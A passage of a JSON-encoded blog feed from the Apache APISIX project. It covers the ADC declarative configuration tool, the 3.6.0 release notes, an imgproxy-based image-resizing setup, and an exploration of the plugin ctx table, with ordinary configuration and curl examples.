validate -f config.yaml\\n```\\n\\nIf the configuration is valid, you will receive a response similar to:\\n\\n```shell\\nRead configuration file successfully: config name: Basic configuration, version: 1.0.0, routes: 1, services: 1.\\nSuccessfully validated configuration file!\\n```\\n\\n### Syncing Configuration to APISIX Instance\\n\\nADC can now be used to synchronize valid configurations with connected APISIX instances. To do this, run:\\n\\n```shell\\nadc sync -f config.yaml\\n```\\n\\nThis will create a route and a service as we declared in the configuration file:\\n\\n```shell\\ncreating service: \\"httpbin-service\\"\\ncreating route: \\"httpbin-route\\"\\nSummary: created 2, updated 0, deleted 0\\n```\\n\\nTo verify that the route was created correctly, let\'s try sending a request:\\n\\n```shell\\ncurl localhost:9080/anything -H \\"host:api7.ai\\"\\n```\\n\\nIf everything is correct, you will receive a response from [httpbin.org](httpbin.org).\\n\\n### Comparing Local and Running Configuration\\n\\nNow, let\'s update the local configuration in the `config.yaml` file by adding another route:\\n\\n```yaml title=\\"config.yaml\\" {20-24}\\nname: \\"Basic configuration\\"\\nversion: \\"1.0.0\\"\\nservices:\\n  - name: httpbin-service\\n    hosts:\\n      - api7.ai\\n    upstream:\\n      name: httpbin\\n      nodes:\\n        - host: httpbin.org\\n          port: 80\\n          weight: 1\\nroutes:\\n  - name: httpbin-route-anything\\n    service_id: httpbin-service\\n    uri: \\"/anything\\"\\n    methods:\\n      - GET\\n  - name: httpbin-route-ip\\n    service_id: httpbin-service\\n    uri: \\"/ip\\"\\n    methods:\\n      - GET\\n```\\n\\nBefore synchronizing this configuration with APISIX, ADC allows you to check the differences between it and the existing APISIX configuration. You can run the following operations:\\n\\n```shell\\nadc diff -f config.yaml\\n```\\n\\nYou can see the added and deleted configurations and check the changes before applying the configuration.\\n\\n### Converting OpenAPI Definitions to APISIX Configurations\\n\\nADC also supports the use of [OpenAPI definitions](https://spec.openapis.org/oas/v3.0.0). ADC allows the conversion of OpenAPI format definitions into APISIX configurations.\\n\\nFor example, if you document your API in OpenAPI format like this:\\n\\n```yaml title=\\"openAPI.yaml\\"\\nopenapi: 3.0.0\\ninfo:\\n  title: httpbin API\\n  description: Routes for httpbin API\\n  version: 1.0.0\\nservers:\\n  - url: http://httpbin.org\\npaths:\\n  /anything:\\n    get:\\n      tags:\\n        - default\\n      summary: Returns anything that is passed in the request data\\n      operationId: getAnything\\n      parameters:\\n        - name: host\\n          in: header\\n          schema:\\n            type: string\\n          example: \\"{{host}}\\"\\n      responses:\\n        \\"200\\":\\n          description: Successfully return anything\\n          content:\\n            application/json: {}\\n  /ip:\\n    get:\\n      tags:\\n        - default\\n      summary: Returns the IP address of the requester\\n      operationId: getIP\\n      responses:\\n        \\"200\\":\\n          description: Successfully return IP\\n          content:\\n            application/json: {}\\n```\\n\\nYou can convert this to an APISIX configuration using the subcommand `openapi2apisix` as follows:\\n\\n```shell\\nadc openapi2apisix -o config.yaml -f openAPI.yaml\\n```\\n\\nThis will create a configuration file as shown below:\\n\\n```yaml title=\\"config.yaml\\"\\nname: \\"\\"\\nroutes:\\n- desc: Returns anything that is passed in the request data\\n  id: \\"\\"\\n  methods:\\n  - GET\\n  name: getAnything\\n  uris:\\n  - /anything\\n- desc: Returns the IP address of the requester\\n  id: \\"\\"\\n  methods:\\n  - GET\\n  name: getIP\\n  uris:\\n  - /ip\\nservices:\\n- desc: Routes for httpbin API\\n  id: \\"\\"\\n  name: httpbin API\\n  upstream:\\n    id: \\"\\"\\n    name: \\"\\"\\n    nodes: null\\nversion: \\"\\"\\n```\\n\\nAs you can see, the configuration is incomplete and a lot of configuration still needs to be added manually. We are improving ADC to bridge the gap between OpenAPI definitions and configurations that can be mapped directly to APISIX.\\n\\n### Tip: Use Autocomplete\\n\\nADC offers many functions, and the list of features is sure to grow. To learn how to use any subcommand, you can use the `--help` or `-h` flag, which will display the documentation for that subcommand.\\n\\nTo make it even easier, you can use the `completion` subcommand to generate an autocompletion script for your shell environment. For example, if you are using a zsh shell, you can run:\\n\\n```shell\\nadc completion zsh\\n```\\n\\nYou can then copy and paste the output into your `.zshrc` file and it will start showing hints when you use `adc`.\\n\\nADC is still in its infancy and is constantly being improved. To learn more about the project, report a bug, or suggest a feature, visit [github.com/api7/adc](github.com/api7/adc).\\n\\n## Summary\\n\\nBy using the declarative configuration tool ADC, APISIX provides a more simplified, reliable, and traceable management method, allowing developers to manage and deploy API gateway configurations more efficiently. This new feature brings many benefits to team collaboration, environmental consistency, and configuration management, providing strong support for building reliable cloud-native architectures.\\n\\nIn non-Kubernetes environments, users can seamlessly integrate tools like Jenkins and ArgoCD. They can leverage GitOps\' internal CI/CD approach to manage various aspects of APISIX, enabling functions like multi-environment releases."},{"id":"Release Apache APISIX 3.6.0","metadata":{"permalink":"/blog/2023/10/05/release-apache-apisix-3.6.0","source":"@site/blog/2023/10/05/release-apache-apisix-3.6.0.md","title":"Release Apache APISIX 3.6.0","description":"The Apache APISIX 3.6.0 version is released on October 5, 2023. This release includes a few new features, bug fixes, and continuous improvements to user experiences.","date":"2023-10-05T00:00:00.000Z","formattedDate":"October 5, 2023","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.965,"truncated":true,"authors":[{"name":"Xin Rong","title":"Author","url":"https://github.com/AlinsRan","image_url":"https://avatars.githubusercontent.com/u/79972061?v=4","imageURL":"https://avatars.githubusercontent.com/u/79972061?v=4"},{"name":"Traky Deng","title":"Technical Writer","url":"https://github.com/kayx23","image_url":"https://avatars.githubusercontent.com/u/39619599?v=4","imageURL":"https://avatars.githubusercontent.com/u/39619599?v=4"}],"prevItem":{"title":"Embracing GitOps: APISIX\'s New Feature for Declarative Configuration","permalink":"/blog/2023/10/07/apisix-gitops-adc"},"nextItem":{"title":"Resizing images on-the-fly","permalink":"/blog/2023/10/05/resize-images-on-the-fly"}},"content":"We are glad to present Apache APISIX 3.6.0 with exciting new features, bug fixes, and other improvements to user experiences.\\n\\n\x3c!--truncate--\x3e\\n\\nThis new release adds a number of new features, including the support for using local DNS resolvers in service discovery, forwarding Dubbo traffic, the use of NGINX variables in `opentelemetry` plugin, and more.\\n\\nThere are also a few important changes included in this release. Should you find these changes impacting your operations, please plan your upgrade accordingly.\\n\\n## Breaking Changes\\n\\n### Remove gRPC support between APISIX and etcd\\n\\nThe support of gPRC communication between APISIX and etcd is removed in this release, which removes `etcd.use_grpc` option in the configuration files. The change resolves a few bugs.\\n\\nIf you are currently using gRPC between APISIX and etcd, please plan for a change to use HTTP.\\n\\nFor more information, see [change proposal](https://lists.apache.org/thread/b69vjkbdszdtk9y30k45c2tvg4f3hqwt) and [PR #10015](https://github.com/apache/apisix/pull/10015).\\n\\n### Remove Conf Server\\n\\nConf server is removed following the removal of gRPC support between APISIX and etcd. The change resolves a few bugs.\\n\\nIf you are currently deploying APISIX in decoupled mode, please note that in this release, data plane (DP) APISIX instance no longer directly communicates with the control plane (CP) APISIX instance. Both instances now communicate with etcd. Please plan for a change to update the configurations accordingly as per the [decoupled mode documentation](https://github.com/apache/apisix/blob/release/3.6/docs/en/latest/deployment-modes.md#decoupled).\\n\\nFor more information, see [change proposal](https://lists.apache.org/thread/b69vjkbdszdtk9y30k45c2tvg4f3hqwt) and [PR #10012](https://github.com/apache/apisix/pull/10012).\\n\\n### Enforce strict schema validation of the APISIX core resources\\n\\nEnforce strict schema validation on the APISIX core resources.\\n\\nFor example, if you configure a custom field to the upstream:\\n\\n```shell\\ncurl http://127.0.0.1:9180/apisix/admin/upstreams/1 -X PUT \\\\\\n  -H \\"X-API-KEY: ${ADMIN_API_KEY}\\" \\\\\\n  -d \'{\\n    \\"type\\": \\"roundrobin\\",\\n    \\"nodes\\": {\\n      \\"127.0.0.1:8080\\": 1\\n    },\\n    \\"custom_field\\": \\"this_is_not_allowed\\"\\n  }\'\\n```\\n\\nYou should receive a `400` response of the following:\\n\\n```text\\n{\\"error_msg\\":\\"invalid configuration: additional properties forbidden found .*\\"\\\\}\\n```\\n\\nFor more information, see [PR #10233](https://github.com/apache/apisix/pull/10233).\\n\\n## New Features\\n\\n### Support the use of local DNS resolvers for service discovery\\n\\nSupport the configuration of local DNS resolvers for service discovery. The configuration files now offer a new option `resolv_conf`, where you can specify the path to the file with a list of local DNS resolvers.\\n\\nYou should configure only one of the `servers` and `resolv_conf`, such as the following:\\n\\n```yaml title=\\"conf/config.yaml\\"\\ndiscovery:\\n  dns:\\n    # servers:\\n    #  - \\"127.0.0.1:8600\\"          # Address of DNS server.\\n    resolv_conf: /etc/resolv.conf  # Path to the local DNS resolver config.\\n```\\n\\nFor more information, see [PR #9770](https://github.com/apache/apisix/pull/9770).\\n\\n### Support direct forwarding of Dubbo traffic\\n\\nSupport Dubbo protocol in xRPC, which allows APISIX to directly forward Dubbo traffic.\\n\\nFor more information, see [PR #9660](https://github.com/apache/apisix/pull/9660).\\n\\n### Support the use of NGINX variables in `opentelemetry` plugin\\n\\nSupport the use of NGINX variables in `opentelemetry` plugin. For example, you can configure the configuration file as follows:\\n\\n```yaml title=\\"conf/config.yaml\\"\\nhttp:\\n  enable_access_log: true\\n  access_log: \\"/dev/stdout\\"\\n  access_log_format: \'{\\"time\\": \\"$time_iso8601\\",\\"opentelemetry_context_traceparent\\": \\"$opentelemetry_context_traceparent\\",\\"opentelemetry_trace_id\\": \\"$opentelemetry_trace_id\\",\\"opentelemetry_span_id\\": \\"$opentelemetry_span_id\\",\\"remote_addr\\": \\"$remote_addr\\",\\"uri\\": \\"$uri\\"}\'\\n  access_log_format_escape: json\\nplugins:\\n  - opentelemetry\\nplugin_attr:\\n  opentelemetry:\\n    set_ngx_var: true\\n```\\n\\nFor more information, see [PR #8871](https://github.com/apache/apisix/pull/8871).\\n\\n### Support rewriting request body in external plugins\\n\\nSupport the rewrite of request body in external (i.e. non-Lua) plugins.\\n\\nFor more information, see [PR #9990](https://github.com/apache/apisix/pull/9990).\\n\\n## Other Updates\\n\\n- Support configuring the buffer size for the access log ([PR #10225](https://github.com/apache/apisix/pull/10225))\\n- Remove Rust dependency to simplify installation ([PR #10121](https://github.com/apache/apisix/pull/10121))\\n- Support HTTPS in `traffic-split` plugin ([PR #9115](https://github.com/apache/apisix/pull/9115))\\n- Support UNIX sock host pattern in the `chaitin-waf` plugin ([PR #10161](https://github.com/apache/apisix/pull/10161))\\n- Fix GraphQL POST request route matching exception ([PR #10198](https://github.com/apache/apisix/pull/10198))\\n- Add error handlers for invalid `cache_zone` in the `proxy-cache` plugin ([PR #10138](https://github.com/apache/apisix/pull/10138))\\n\\n## Changelog\\n\\nFor a complete list of changes in this release, please see [CHANGELOG](https://github.com/apache/apisix/blob/master/CHANGELOG.md#360)."},{"id":"Resizing images on-the-fly","metadata":{"permalink":"/blog/2023/10/05/resize-images-on-the-fly","source":"@site/blog/2023/10/05/resize-images-on-the-fly.md","title":"Resizing images on-the-fly","description":"As a web architect, one of the many issues is asset management. And the most significant issue in assets is images. A naive approach would be to set an image and let the browser resize the image via CSS. However, it means that you download the original image. It entails two problems: the size of the original image and the suboptimal browser-based resizing. This post will cover two alternatives: traditional and brand-new solutions.\\n","date":"2023-10-05T00:00:00.000Z","formattedDate":"October 5, 2023","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":5.8,"truncated":true,"authors":[{"name":"Nicolas Fr\xe4nkel","title":"Author","url":"https://github.com/nfrankel","image_url":"https://avatars.githubusercontent.com/u/752258","imageURL":"https://avatars.githubusercontent.com/u/752258"}],"prevItem":{"title":"Release Apache APISIX 3.6.0","permalink":"/blog/2023/10/05/release-apache-apisix-3.6.0"},"nextItem":{"title":"Down the rabbit hole of an Apache APISIX plugin","permalink":"/blog/2023/09/28/rabbit-hole-apisix-plugin"}},"content":">This blog xplores effective strategies for image asset management in web architecture, highlighting traditional and innovative solutions to optimize delivery and avoid reliance on CSS resizing.\\n\\n\x3c!--truncate--\x3e\\n\\n<head>\\n    <link rel=\\"canonical\\" href=\\"https://blog.frankel.ch/resize-images-on-the-fly/\\" />\\n</head>\\n\\nAs a web architect, one of the many issues is asset management. And the most significant issue in assets is images. A naive approach would be to set an image and let the browser resize the image via CSS:\\n\\n>```css\\n>img {\\n>    height: 100%;\\n>    width: 100%;\\n>    object-fit: contain;\\n>}\\n>```\\n\\nHowever, it means that you download the original image. It entails two problems: the size of the original image and the suboptimal browser-based resizing.\\n\\nThis post will cover two alternatives: traditional and brand-new solutions.\\n\\n## Ahead-of-time resizing\\n\\nThe traditional solution to a single image source has been ahead-of-time resizing. Before releasing, designers would take time to provide multiple image versions in different resolutions. On this blog, I\'m using this technique. I provide three resolutions to display the post\'s main image in different contexts as background images:\\n\\n* large for the post on its page\\n* medium for the post on the home page\\n* small for related posts on a post page\\n\\nI also remove JPEG metadata for an even higher size reduction.\\n\\nYet, the traditional approach is to take advantage of the HTML `picture` tag:\\n\\n>The `<picture>` HTML element contains zero or more `<source>` elements and one `<img>` element to offer alternative versions of an image for different display/device scenarios.\\n>\\n>The browser will consider each child `<source>` element and choose the best match among them. If no matches are found\u2014or the browser doesn\'t support the `<picture>` element\u2014the URL of the `<img>` element\'s src attribute is selected. The selected image is then presented in the space occupied by the `<img>` element.\\n>\\n>-- [The Picture element on MDN web docs](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/picture)\\n\\nIn turn, one can use it like the following:\\n\\n```html\\n<picture>\\n    <source media=\\"(max-width: 199px)\\" srcset=\\"ai-generated-200.jpg\\" />\\n    <source media=\\"(max-width: 399px)\\" srcset=\\"ai-generated-400.jpg\\" />\\n    <source media=\\"(max-width: 599px)\\" srcset=\\"ai-generated-600.jpg\\" />\\n    <source media=\\"(max-width: 799px)\\" srcset=\\"ai-generated-800.jpg\\" />\\n    <source media=\\"(max-width: 999px)\\" srcset=\\"ai-generated-1000.jpg\\" />\\n    <img src=\\"ai-generated.jpg\\" />\\n</picture>\\n```\\n\\nThis way has worked for ages, but it has two issues. First, providing multiple resolutions for each image takes a long time. One could automate the process and get good results with AI.\\n\\nHowever, the volume of necessary storage could be twice or thrice the size of the original image, depending on the number of extra resolutions created. In an assets-rich environment, _e.g._, e-commerce would significantly increase costs.\\n\\n## On-the-fly resizing\\n\\nI recently stumbled upon `imgproxy`, a component to resize images on-the-fly:\\n\\n>imgproxy makes websites and apps blazing fast while saving storage and SaaS costs\\n>\\n>-- [imgproxy website](https://imgproxy.net/)\\n\\nIt offers an endpoint where you can send an encoded URL that defines:\\n\\n* The image to resize and its location, _e.g., local, an HTTP URL, a S3 bucket, etc.\\n* Different sizing parameters, _e.g._, the dimensions, whether to fit or to fill, etc.\\n* The format. imgproxy supports standard formats such as JPEG and PNG but also more modern ones like WebP and AVIF. It can also choose the best format depending on the \' Accept \' header.\\n* Many (many!) other options, like watermarking, filtering, rotation, etc.\\n\\nimgproxy offers both an Open Source free version and a paid version; everything included in this post is part of the former.\\n\\nOne solution would be for the web developer to code each imgproxy URL in the HTML:\\n\\n```html\\n<picture>\\n    <source media=\\"(max-width: 199px)\\" srcset=\\"http://imgproxy:8080//rs:fill/w:200/plain/http://server:3000/ai-generated.jpg@webp\\" />\\n    <source media=\\"(max-width: 399px)\\" srcset=\\"http://imgproxy:8080//rs:fill/w:400/plain/http://server:3000/ai-generated.jpg@webp\\" />\\n    <source media=\\"(max-width: 599px)\\" srcset=\\"http://imgproxy:8080//rs:fill/w:600/plain/http://server:3000/ai-generated.jpg@webp\\" />\\n    <source media=\\"(max-width: 799px)\\" srcset=\\"http://imgproxy:8080//rs:fill/w:800/plain/http://server:3000/ai-generated.jpg@webp\\" />\\n    <source media=\\"(max-width: 999px)\\" srcset=\\"http://imgproxy:8080//rs:fill/w:1000/plain/http://server:3000/ai-generated.jpg@webp\\" />\\n    <img src=\\"ai-generated.jpg\\" />\\n</picture>\\n```\\n\\nIt leaks topology-related details on the web page. It\'s not a maintainable solution. We can solve the issue with a reverse proxy or an API Gateway. I\'ll use Apache APISIX for obvious reasons.\\n\\nWith this approach, the above HTML becomes much more straightforward:\\n\\n```html\\n<picture>\\n    <source media=\\"(max-width: 199px)\\" srcset=\\"/resize/200/ai-generated.jpg\\" />\\n    <source media=\\"(max-width: 399px)\\" srcset=\\"/resize/400/ai-generated.jpg\\" />\\n    <source media=\\"(max-width: 599px)\\" srcset=\\"/resize/600/ai-generated.jpg\\" />\\n    <source media=\\"(max-width: 799px)\\" srcset=\\"/resize/800/ai-generated.jpg\\" />\\n    <source media=\\"(max-width: 999px)\\" srcset=\\"/resize/1000/ai-generated.jpg\\" />\\n    <img src=\\"ai-generated.jpg\\" />\\n</picture>\\n```\\n\\nApache APISIX intercepts requests starting with `/resize`, rewrites the URL for `imgproxy`, and forwards the rewritten URL to `imgproxy`. Here\'s the overall flow:\\n\\n![imgproxy sequence diagram](https://static.apiseven.com/uploads/2023/10/03/m0gpUr5y_imgproxy-flow.svg)\\n\\nThe corresponding Apache APISIX configuration looks like the following:\\n\\n```yaml\\nroutes:\\n  - uri: /resize/*                                          #1\\n    plugins:\\n      proxy-rewrite:                                        #2\\n        regex_uri:\\n          - /resize/(.*)/(.*)                               #3\\n          - /rs:fill/w:$1/plain/http://server:3000/$2@webp  #4\\n    upstream:\\n      nodes:\\n        \\"imgproxy:8080\\": 1\\n```\\n\\n1. Match requests prefixed with `/resize`\\n2. Rewrite the URL\\n3. Catches the width and the image in the regular expression\\n4. Format the URL for `imgproxy`. `http://server:3000` is the server hosting the original image; `@webp` indicates a preference for WebP format (if the browser supports it)\\n\\nWith the above, `/resize/200/ai-generated.jpg` to Apache APISIX is rewritten as `/rs:fill/w:200/plain/http://server:3000/ai-generated.jpg@webp` to `imgproxy`.\\n\\n### Testing\\n\\nWe can set up a small testing sample with Docker Compose:\\n\\n```yaml\\nservices:\\n  apisix:\\n    image: apache/apisix:3.5.0-debian\\n    volumes:\\n      - ./apisix/config.yml:/usr/local/apisix/conf/config.yaml:ro\\n      - ./apisix/apisix.yml:/usr/local/apisix/conf/apisix.yaml:ro\\n    ports:\\n      - \\"9080:9080\\"\\n  imgproxy:\\n    image: darthsim/imgproxy:v3.19\\n  server:                                                         #1\\n    build: content\\n```\\n\\n1. Simple web server hosting the HTML and the main image\\n\\nWe can now test the above setup with the browser\'s Developer Tools, emulating small screen devices, _i.e._, iPhone SE. The result is the following:\\n\\n![Test setup result](https://static.apiseven.com/uploads/2023/10/03/a3nO1pyI_test-set-up-result.jpg)\\n\\n* Because of the screen resolution, the image requested is the 400px width, not the original one. You can see it in the request\'s URL\\n* The returned image is in WebP format; its weight is 14.4kb\\n* The original JPEG image weighs 154kb, more than ten times as much. It\'s a lot of network bandwidth saving!\\n\\n### Discussion\\n\\nCutting your storage costs by ten is naturally a great benefit. However, it\'s not all unicorns and rainbows. Computing the resized image is a compute-intensive operation; it costs CPU time for each request. Moreover, however efficient `imgproxy` is, it takes time to create the image. We traded storage costs for CPU costs and now incur a slight performance hit.\\n\\nTo fix it, we need a caching layer in front, either a custom one or, more likely, a  <abbr title=\\"Content Delivery Network\\">CDN</abbr> . You may object that we will store assets again; thus, storage costs will rise again. However, a considerable difference is that the cache works only for **used** images, whereas we previously paid for storing all images in the first solution. You can also apply known recipes for caching, such as pre-warming, when you know a group of images will be in high demand, _e.g._, before an event.\\n\\n## Conclusion\\n\\nIn this post, we described how to use Apache APISIX with `imgproxy` to reduce the storage cost of images in multiple resolutions. With caching on top, it adds more components to the overall architecture but shrinks down storage costs.\\n\\nThis post was inspired by Andreas Lehr\'s talk at [StackConf](https://stackconf.eu/talks/dynamic-image-optimization-with-imgproxy-at-schwarz-it/).\\n\\nThe complete source code for this post can be found on [GitHub](https://github.com/ajavageek/resize-on-the-fly).\\n\\n**To go further:**\\n\\n* [imgproxy documentation](https://docs.imgproxy.net/)\\n* [imgproxy interactive demo](https://imgproxy.net/)\\n\\n_Originally published at [A Java Geek](https://blog.frankel.ch/resize-images-on-the-fly/) on October 1<sup>st</sup>, 2023_"},{"id":"Down the rabbit hole of an Apache APISIX plugin","metadata":{"permalink":"/blog/2023/09/28/rabbit-hole-apisix-plugin","source":"@site/blog/2023/09/28/rabbit-hole-apisix-plugin.md","title":"Down the rabbit hole of an Apache APISIX plugin","description":"My demo, Evolving your APIs, features a custom Apache APISIX plugin. I believe that the process of creating a custom plugin is relatively well-documented. However, I wanted to check the parameters of the `_M.access(conf, ctx)` function, especially the `ctx` one.\\n","date":"2023-09-28T00:00:00.000Z","formattedDate":"September 28, 2023","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":4.55,"truncated":true,"authors":[{"name":"Nicolas Fr\xe4nkel","title":"Author","url":"https://github.com/nfrankel","image_url":"https://avatars.githubusercontent.com/u/752258","imageURL":"https://avatars.githubusercontent.com/u/752258"}],"prevItem":{"title":"Resizing images on-the-fly","permalink":"/blog/2023/10/05/resize-images-on-the-fly"},"nextItem":{"title":"Biweekly Report (September 11 - September 24)","permalink":"/blog/2023/09/26/bi-weekly-report"}},"content":">My demo, Evolving your APIs, features a custom Apache APISIX plugin. I believe that the process of [creating a custom plugin](https://apisix.apache.org/docs/apisix/plugin-develop/) is relatively well-documented. However, I wanted to check the parameters of the `_M.access(conf, ctx)` function, especially the `ctx` one.\\n\\n\x3c!--truncate--\x3e\\n\\n<head>\\n    <link rel=\\"canonical\\" href=\\"https://blog.frankel.ch/rabbit-hole-apisix-plugin/\\" />\\n</head>\\n\\nThe documentation states:\\n\\n>The `ctx` parameter caches data information related to the request. You can use `core.log.warn(core.json.encode(ctx, true))` to output it to `error.log` for viewing.\\n\\nUnfortunately, `core.log` ultimately depends on nginx\'s logging, and its buffer is limited in size. Thanks to my colleague [Abhishek](https://twitter.com/shreemaan_abhi) for finding [the info](http://nginx.org/en/docs/dev/development_guide.html#logging). For this reason, the `ctx` display is (heavily) truncated. I had to log data bit by bit; however, it was instructive.\\n\\n## The context\\n\\nThe `ctx` parameter is a Lua table. In Lua, table data structures are used for regular indexed access (akin to arrays) and key access (like hash maps). A single `ctx` instance is used for each _request_.\\n\\nThe Apache APISIX engine reads and writes data in the `ctx` table. It\'s responsible for forwarding the latter from plugin to plugin. In turn, each plugin can also read and write data.\\n\\nI resorted to a custom plugin to conditionally apply rate-limiting in the demo. The custom plugin is a copy-paste of the [limit-count](https://apisix.apache.org/docs/apisix/plugins/limit-count/) plugin. Note that the analysis is done in a specific context. Refrain from assuming the same data is available in your own. However, it should be a good starting point.\\n\\n## Overview of the `ctx` parameter\\n\\nThe data available in the `ctx` parameter is overwhelming. To better understand it, we shall go from the more general to the more particular. Let\'s start from the overview.\\n\\n![Overview of the ctx parameter](https://static.apiseven.com/uploads/2023/09/22/noheoMDj_ctx-overview.svg)\\n\\n* `_plugin_name`: self-explanatory\\n* `conf_id`: either route ID or service ID\\n* `proxy_rewrite_regex_uri_capture`: data set by the [proxy-rewrite](https://github.com/apache/apisix/blob/a82a2f3c439119ade45b4afffb5a251cd7bb65d2/apisix/plugins/proxy-rewrite.lua#L46C2) plugin.\\n* `route_id`: route ID the plugin is applied to\\n* `route_name`: route name the plugin is applied to\\n* `real_current_req_matched_path`: URI for which matching was done\\n* `conf_version`: etcd-related revision - see below\\n* `var`: references the `ctx` object and a cache of data about the request, _e.g._, URI, method, etc.\\n* `matched_route`: the route that was matched based on host header/URI and/or `remote_addr`; see below\\n* `plugins`: pairs of plugin/data - see below\\n\\n## Matched route\\n\\nThe `matched_route` row is a complex data tree that deserves a detailed description.\\n\\n![Matched route row](https://static.apiseven.com/uploads/2023/09/22/fYJFkdDM_matched-route.svg)\\n\\n* `key`: access key in the `etcd` datastore\\n* `created_index`, `modifiedIndex` and `orig_modifiedIndex`: these attributes are related to etcd and how it stores metadata associated with revisions. Different revisions of a single key are logged in the `create_revision` and `pre_revision` fields. The former points to the initial created row ID and is constant throughout the changes, while the latter points to the row ID of the previous value.\\n\\n    Apache APISIX maps them respectively to the `created_index` and `modifiedIndex` values and uses them for caching. In many places, `created_index` is later assigned to `conf_version` - see above.\\n* `prev_plugin_config_ver`: after a plugin configuration is merged with the route configuration, the current `modifiedIndex` is assigned to `prev_plugin_config_ver`. It allows saving CPU cycles if one attempts to apply the same plugin config later in the call chain.\\n* `update_count`: replaced with `modifiedIndex`\\n* `has_domain`: whether the matched route references an upstream with a domain, _e.g._, `http://httpbin.org`, or not, _e.g._, `192.168.0.1`\\n* `orig_plugins`: temporary placeholder used if a route has plugins defined directly and reference a plugins config\\n* `clean_handlers`: list of functions scheduled to be called after a plugin has been created\\n* `value` has  keys related to how the route was created, as well as a couple of others:\\n\\n    ```bash\\n    curl http://apisix:9180/apisix/admin/routes/2 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n    {\\n      \\"name\\": \\"Versioned Route to Old API\\",\\n      \\"methods\\": [\\"GET\\"],\\n      \\"uris\\": [\\"/v1/hello\\", \\"/v1/hello/\\", \\"/v1/hello/*\\"],\\n      \\"upstream_id\\": 1,\\n      \\"plugin_config_id\\": 1\\n    }\'\\n    ```\\n\\n* `priority`: since we didn\'t set it, it has a default value 0. [Priority](https://apisix.apache.org/docs/apisix/admin-api/#request-body-parameters) is essential when multiple routes match to determine which one to apply.\\n* `create_time`: self-explanatory\\n* `update_time`: self-explanatory\\n* `plugins`: references to plugin\'s function\\n* `status`: I couldn\'t find this\\n\\n## Plugins\\n\\nThe `plugins` value contains plugin-related data in an indexed-based Lua table. Each plugin has two entries: the first (even-indexed) entry contains data related to the plugin in general, _e.g._, its schema; while the second (odd-index) entry data is related to its configuration in the current route.\\n\\nMy setup has two plugins, hence four entries, but to keep things simpler, I kept only a single plugin in the following diagram:\\n\\n![Plugins](https://static.apiseven.com/uploads/2023/09/22/eEbKgUOu_plugins.svg)\\n\\nKey values match directly to the plugin schema and configuration; you can check the whole descriptions directly in the plugin.\\n\\n## A final trick\\n\\nI initially had issues printing the `ctx` table because of the nginx buffer limit and had to do it bit by bit. However, you can print it to a file.\\n\\nHere\'s the function, courtesy of my colleague [Zeping Bai](https://github.com/bzp2010):\\n\\n```lua\\nlocal file, err = io.open(\\"conf/ctx.json\\", \\"w+\\")\\nif not file then\\n    ngx.log(ngx.ERR, \\"failed to open file: \\", err)\\n    return\\nend\\nfile.write(core.json.encode(ctx, true) .. \\"\\\\n\\")\\nfile.close()\\n```\\n\\nHere\'s the whole [data representation with PlantUML](https://www.plantuml.com/plantuml/svg/xLfVSzis4d_Nfy3myj2ciaKfjc9vEhrwNFVYQHff4YSplKRbGCHAH4m2AlxuJpt-xaVIa49lQCDmgaiVel6BYH-0tovs5mjWVzI6AlD1Iz6vwf3o5oNBt2wuI0Gj8DedaHNKccmhvmKtKVS6aqenJpYhcWUhRqibBouJ1UUA6qWKBE0YiOedALqQgq2Nu9iPQdHSzUsTzNiPvBcint0j_QhbvclzyTgDhwGrW2Pr7rTKtu7IN0fWv7NrdHX9nZaZ1vFZDSbQjehBxwiP6woS75mgRYvBJ3-EzxgtMvryrMnpAr9JJhTFueldWvtHxjxk7jtPsujGbxCRLb69s-wZDfrcKD2rQX0HkGHbU5Dr66DrfMgQ9mh-jA1DhN4hD9q3weGwCj2fuajJ4wl78NWSmeKsG5cNdBmuVaFAltT7htyZRr-zEVZvQBif9HxSN2vh3Ssap86A-w0CvjJcfaJFQQwX5NZTtZ_Af3RtIxcane2g9VpZztXhHBV-EjZwxzRszBjlzj-_PrVzxkxrj_z-iYReLvI0SrBDI-PI4RlKHW4j7gAB4id58WeIq2f-ltm5lNW9Oc6o4hOJZuRTXwdY_VlUzjD0eKikZvJvFcJ1nLg0Vf1k2Z2PPFUh1uGjcgxUZlhFqGccY24lZWv-yc4cupSdNinRB-IdevT79qS-rA-_78vV-a27uyblte76xxoJZISdn-DNRxp2lHvFVZv-vLNKo_7XBpxCsrSFGKqEJWvV-40dhmyEZw8xCTDGE_OxZDiBYQet8MUeGSQTb9tGhX2yExHlQHZfbMNTcSWvSTidcLsIr6eZ2_uNC28L0zNKZa-VN1XOWC8wyUW6ExTIKYKAz58A3GyJJGeOprr4yF_y0_gZl5_03R2Gim-GcWUoyAAcdxLCZ6iwo_thqveuVDRCSvuRK8-nUTULC32W2Yv0a_CCJ0QAc0oS5n01m3Gnaio0m0MarW0Zr11bXU45X3W4LOfUUgJj-FGGRX6Uz0ee0uN3YpzJSFtgRC6baqWNuJxva3MaZF6A1yqdpTXOvvLuVh-gF3rSyd9h9fJS1uLjZs2ju71HDY4IpZ0d0HAYNvca_x4__Uw9lsEu8OM7sSq4_t0dtZ1hOOiPg4Uo3kurxMncV3yoGCkH1lD_yxYl7lVLuxvwd892dk4iqUywnmOAZzTuagw0ZhoQB81Yw2dIUs_ZVFNlNg9EE29WYQ--VEhbZvRXKN9JqH5FiE5eUDtTF3iSzJOHZQQRDdLFwpJeQBL-7N4MvGzmWsudFA3v0vZ_JEV8af9i-z3XTdWTVlDiCcg8jZDjkB46o5p9WgGv1s4-kPdkaboUWoBhYwkoiwXHxl25JzfuSJ5HVwmAZKtHarGM1GXJZMGohadvHqb1rMajYhIAS55D06nrtU2UYZht48m4BM1z_xYrUgj2e7ASz3HnmxM_OyL3kXD77JGD2W3UzoTyzCQctn8PwoV1RxQVVjkcsDwJ_ctnfuYX_paFaQ5f2bgtAu76pzWmZW8Ux2eTS0KCITPKlRJYhlqjCho0v9mB9iy_DT1fg2dwRnlGNNDagdkwZ_Bl03pRtRkBx2bS9cx-ptw0EQCgwdeXIIgB6HUqMgNDNUVZLycQt2EkpR1U_WOcTCbBhOUHQTYKPwKkqjngVWQ_Si6BUjMGitXkylsaa1VyO-Wek0cqIIePU3TansOGX_3ftlk4wuRS7OqUP0YxyRCW-MYUo_E4mK9HHjt6UlN57-zrLfAgYqgIFwqqD0dnco1kHbbud44KUk7di-c7xjBdDn1C51JIG48PK-7